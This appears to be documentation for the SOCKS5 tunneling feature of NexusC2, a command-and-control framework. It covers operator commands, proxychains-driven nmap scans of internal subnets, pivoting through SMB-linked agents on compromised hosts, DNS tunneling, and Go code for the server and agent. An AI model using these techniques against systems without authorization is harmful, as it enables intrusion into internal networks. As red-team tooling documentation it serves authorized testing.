# SOCKS5 Proxy Tunneling

## Overview

NexusC2 provides two SOCKS5 proxy implementations for routing traffic through deployed agents:

| Command | Transport | Latency | Linked Agent Support | Use Case |
|---------|-----------|---------|---------------------|----------|
| **socks-ws** | WebSocket | Low (real-time) | No | Direct agents, interactive sessions |
| **socks-http** | HTTP Polling | Higher (polling-based) | Yes | Linked agents, SMB/TCP chains |

Both implementations enable operators to route traffic through compromised hosts, accessing internal network resources that aren't directly reachable from the C2 server.

**Platforms:** All (Windows, Linux, macOS)

---

## Choosing Between socks-ws and socks-http

### socks-ws (WebSocket-based)

**Pros:**
- Real-time, low-latency data transfer
- Dedicated WebSocket connection for optimal throughput
- Better for interactive sessions (SSH, RDP, browsing)
- Full SOCKS5 protocol support

**Cons:**
- Requires agent to make outbound WebSocket connection
- Does NOT work through linked agents (SMB/TCP)
- Only works with direct HTTPS agents

**Best for:** Direct agents when you need responsive, interactive tunneling.

### socks-http (HTTP Polling-based)

**Pros:**
- Works through linked agent chains (SMB, TCP)
- No additional outbound connections from agent
- Uses existing C2 HTTP polling channel
- Supports UDP ASSOCIATE for DNS tunneling

**Cons:**
- Higher latency (depends on agent sleep interval)
- Best used with lower sleep values (e.g., `sleep 5`)
- Not ideal for real-time interactive sessions

**Best for:** Linked agents, pivoting through internal networks, or when WebSocket connections aren't possible.

---

## socks-ws (WebSocket SOCKS)

### Architecture

```
flowchart LR
    subgraph Operator["Operator Workstation"]
        TOOL[Operator Tool<br/>nmap, curl, etc.]
    end

    subgraph Server["NexusC2 Server"]
        direction TB
        SOCKS[SOCKS5 Listener<br/>0.0.0.0:PORT]
        SSH_SRV[SSH Server]
        SOCKS --> SSH_SRV
    end

    subgraph Agent["Compromised Host"]
        direction TB
        WSS[WSS Connection]
        SSH_CLI[SSH Client]
        WSS --> SSH_CLI
    end

    subgraph Target["Internal Network"]
        RES[Target Resource<br/>internal host:port]
    end

    TOOL -->|SOCKS5| SOCKS
    SSH_SRV <-->|SSH-over-WSS| WSS
    SSH_CLI -->|TCP| RES
```

**Key Features:**
- SSH-over-WebSocket tunnel for reliability
- SOCKS5 protocol compliance
- Two-layer authentication (SOCKS5 + SSH)
- Connection pooling and limits
- Stale connection cleanup
- Dynamic keepalive based on agent callback rate

### Communication Flow

#### Connection Establishment

```
1. Operator starts SOCKS proxy on agent
   → Server creates SOCKS5 listener + SSH server
   → Server generates credentials

2. Agent receives socks-ws command
   → Agent connects via WebSocket (wss://server:port/path)
   → Agent performs SSH handshake as client
   → Tunnel is established

3. Operator configures proxy (e.g., proxychains)
   → Tool connects to SOCKS5 listener
   → Server authenticates SOCKS connection
```

#### Data Forwarding

```
1. Tool sends SOCKS5 CONNECT request
   → Server parses target host:port
   → Server opens SSH channel to agent

2. Agent receives channel open request
   → Agent connects to target via TCP
   → Agent accepts SSH channel

3. Bidirectional data flow
   ← Tool → Server → SSH Channel → Agent → Target →
```

### Usage

#### Start Proxy

```
socks-ws start 1080 https://domain.com/some/path 443
```

#### Use with proxychains

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080

# Run commands through proxy
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://internal-server/
```

#### Stop Proxy

```
socks-ws stop 1080
```

### Configuration

| Parameter | Server Default | Agent Default |
|-----------|---------------|---------------|
| SOCKS Port | User-specified | N/A |
| WebSocket Port | 3131 | 3131 |
| Max Connections | N/A | 50 |
| Idle Timeout | 10 minutes | 5 minutes |
| Buffer Size | 32 KB | 32 KB |
| Keepalive | N/A | Dynamic (10s-2min) |
| Stale Cleanup | N/A | 30 seconds |

### Limitations

| Limitation | Description |
|------------|-------------|
| UDP | UDP ASSOCIATE not supported (use socks-http for UDP) |
| Concurrent | Max 50 concurrent tunnels per agent |
| Linked Agents | Does NOT work through SMB/TCP linked agents |
| Authentication | No SOCKS5 user auth (SSH handles auth) |

---

## socks-http (HTTP Polling SOCKS)

### Architecture

```
flowchart LR
    subgraph Operator["Operator Workstation"]
        TOOL[Operator Tool<br/>nmap, curl, etc.]
    end

    subgraph Server["NexusC2 Server"]
        direction TB
        SOCKS[SOCKS5 Listener<br/>0.0.0.0:PORT]
        QUEUE[Command Queue]
        SOCKS --> QUEUE
    end

    subgraph Agent["Direct/Linked Agent"]
        direction TB
        POLL[HTTP Polling]
        HANDLER[SOCKS Handler]
        POLL --> HANDLER
    end

    subgraph Target["Internal Network"]
        RES[Target Resource<br/>internal host:port]
    end

    TOOL -->|SOCKS5| SOCKS
    QUEUE <-->|HTTP POST/GET| POLL
    HANDLER -->|TCP/UDP| RES
```

**Key Features:**
- Uses existing HTTP polling channel
- Works through linked agent chains (SMB, TCP)
- Full SOCKS5 support including UDP ASSOCIATE
- Session-based connection management
- Automatic cleanup of stale sessions

### Communication Flow

#### Session Management

```
1. Operator starts socks-http on agent
   → Server creates SOCKS5 listener
   → Listener ready for incoming connections

2. Tool connects to SOCKS5 listener
   → Server creates session with unique ID
   → Server queues "connect" command to agent

3. Agent polls and receives command
   → Agent connects to target
   → Agent sends response via POST

4. Server receives response
   → Server signals success to SOCKS5 client
   → Bidirectional relay begins via polling
```

#### TCP CONNECT Flow

```
Server → Agent (queued command):
{
  "action": "connect",
  "session_id": "abc123",
  "destination": "192.168.1.100:80"
}

Agent → Server (POST response):
{
  "session_id": "abc123",
  "status": "connected"
}

Data transfer via "data" actions...

Cleanup via "close" action when done
```

#### UDP ASSOCIATE Flow (for DNS, etc.)

```
Server → Agent (queued command):
{
  "action": "udp_associate",
  "session_id": "def456"
}

Agent → Server (POST response):
{
  "session_id": "def456",
  "status": "udp_ready"
}

UDP data packets via "udp_data" actions...
```

### Usage

#### Start Proxy

```
socks-http start 1080
```

#### Optimize for Latency

For better responsiveness, reduce the agent sleep interval:

```
sleep 5          # 5 second check-in for responsive proxying
socks-http start 1080
```

#### Use with proxychains

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080

# Run commands through proxy
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://internal-server/

# DNS through SOCKS (UDP ASSOCIATE)
proxychains dig @8.8.8.8 example.com
```

#### Use with Linked Agents

socks-http is the only SOCKS option that works through linked agents:

```
# On your edge agent, link to internal agent
link smb 192.168.1.50 spoolss

# Switch to the linked agent
# Start SOCKS proxy on the linked agent
socks-http start 1080

# Traffic now routes through:
# Tool → Server → Edge Agent → SMB Link → Internal Agent → Target
```

#### Stop Proxy

```
socks-http stop 1080
```

### Configuration

| Parameter | Default | Description |
|-----------|---------|-------------|
| Session Timeout | 5 minutes | Inactive session cleanup |
| Max Sessions | Unlimited | No hard limit on concurrent sessions |
| Buffer Size | 64 KB | Data chunk size for transfer |
| Cleanup Interval | 60 seconds | How often stale sessions are cleaned |

### Supported SOCKS5 Commands

| Command | Support | Description |
|---------|---------|-------------|
| CONNECT (0x01) | Full | TCP connection to target |
| BIND (0x02) | No | Not implemented |
| UDP ASSOCIATE (0x03) | Full | UDP relay for DNS, etc. |

### Limitations

| Limitation | Description |
|------------|-------------|
| Latency | Higher than socks-ws due to polling |
| Throughput | Limited by polling frequency |
| Interactive | Not ideal for SSH/RDP (use socks-ws) |

---

## Server-Side Components

### socks-ws Components

| Component | File Path |
|-----------|-----------|
| Server SOCKS | `server/internal/agent/socks/socks_server.go` |
| Server Bridge | `server/internal/agent/socks/socks_bridge.go` |
| Server Handler | `server/internal/agent/handlers/socks_handler.go` |
| WebSocket Handler | `server/internal/websocket/handlers/socks.go` |

### socks-http Components

| Component | File Path |
|-----------|-----------|
| Server | `server/internal/agent/socks_http/server.go` |
| WebSocket Handler | `server/internal/websocket/handlers/socks_http.go` |

### Agent Components

| Platform | socks-ws | socks-http |
|----------|----------|------------|
| Linux | `payloads/Linux/action_socks.go` | `payloads/Linux/action_socks_http.go` |
| Windows | `payloads/Windows/action_socks.go` | `payloads/Windows/action_socks_http.go` |
| macOS | `payloads/Darwin/action_socks.go` | `payloads/Darwin/action_socks_http.go` |
| TCP Link | N/A | `payloads/TCP_*/action_socks_http.go` |
| SMB Link | N/A | `payloads/SMB_Windows/action_socks_http.go` |

---

## Technical Details (socks-ws)

### SOCKS5 Listener

The server runs a standard SOCKS5 server:

```go
type Server struct {
    socksPort     int
    socksListener net.Listener
    sshConfig     *ssh.ServerConfig
    sshConn       *ssh.ServerConn
    sshChannels   <-chan ssh.NewChannel
    forwardChan   chan *ForwardRequest
}
```

### SSH Server

The server hosts an SSH server for the agent to connect to:

```go
config := &ssh.ServerConfig{
    PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
        if c.User() == creds.Username && string(pass) == creds.Password {
            return nil, nil
        }
        return nil, fmt.Errorf("invalid credentials")
    },
}

// Generate ephemeral host key
hostKey, _ := generateHostKey()
config.AddHostKey(hostKey)
```

### Agent WebSocket Connection

The agent connects to the server via secure WebSocket:

```go
dialer := websocket.Dialer{
    TLSClientConfig: &tls.Config{
        InsecureSkipVerify: true,
    },
    HandshakeTimeout:  10 * time.Second,
    EnableCompression: false,
}

wsURL := fmt.Sprintf("wss://%s:%d%s", host, port, path)
wsConn, _, _ := dialer.Dial(wsURL, nil)
```

### Dynamic Keepalive

Keepalive adapts to agent callback rate:

```go
func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
    // Parse current sleep and jitter
    sleepSeconds := 60
    jitterPercent := 10.0

    // Calculate average callback interval
    avgCallbackInterval := float64(sleepSeconds) * (1.0 + jitterPercent/200.0)

    // Set keepalive to half the callback interval
    keepaliveInterval := time.Duration(avgCallbackInterval/2.0) * time.Second

    // Enforce bounds (10s - 2min)
    if keepaliveInterval < 10*time.Second {
        return 10 * time.Second
    }
    if keepaliveInterval > 120*time.Second {
        return 120 * time.Second
    }
    return keepaliveInterval
}
```

---

## Quick Reference

### Start SOCKS Proxy

| Method | Command | Requirements |
|--------|---------|--------------|
| WebSocket | `socks-ws start 1080 https://host/path 443` | Direct agent, WebSocket capable |
| HTTP | `socks-http start 1080` | Any agent (direct or linked) |

### Stop SOCKS Proxy

| Method | Command |
|--------|---------|
| WebSocket | `socks-ws stop 1080` |
| HTTP | `socks-http stop 1080` |

### Recommended Configurations

| Scenario | Recommendation |
|----------|---------------|
| Direct agent, need speed | `socks-ws` |
| Linked agent chain | `socks-http` |
| DNS tunneling needed | `socks-http` (UDP support) |
| Interactive session (SSH) | `socks-ws` |
| Slow network scanning | Either (socks-http with lower sleep) |
